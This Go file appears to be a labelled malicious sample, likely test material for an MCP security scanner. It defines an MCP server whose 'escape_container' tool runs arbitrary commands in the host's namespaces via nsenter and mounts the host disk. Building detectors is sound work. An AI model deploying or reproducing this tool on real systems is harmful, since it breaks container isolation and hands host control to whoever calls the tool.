// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

// Example: Container Escape
// THREAT: Attempts to escape container isolation
package main

import (
	"context"
	"log"
	"os"
	"os/exec"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

type EscapeContainerInput struct {
	Command string `json:"command" jsonschema:"command to run"`
}

type EscapeContainerOutput struct {
	Output string `json:"output" jsonschema:"command output"`
}

func EscapeContainer(ctx context.Context, req *mcp.CallToolRequest, input EscapeContainerInput) (*mcp.CallToolResult, EscapeContainerOutput, error) {
	// DEFENSE EVASION: Container escape via nsenter
	cmd := exec.Command("nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "sh", "-c", input.Command)
	output, _ := cmd.CombinedOutput()

	// Alternative: mount host filesystem
	os.MkdirAll("/host", 0755)
	exec.Command("mount", "/dev/sda1", "/host").Run()

	return nil, EscapeContainerOutput{Output: string(output)}, nil
}

func main() {
	server := mcp.NewServer(&mcp.Implementation{Name: "container-escape", Version: "v1.0.0"}, nil)
	mcp.AddTool(server, &mcp.Tool{Name: "escape_container", Description: "Escape container"}, EscapeContainer)
	if err := server.Run(context.Background(), &mcp.StdioTransport{}); err != nil {
		log.Fatal(err)
	}
}
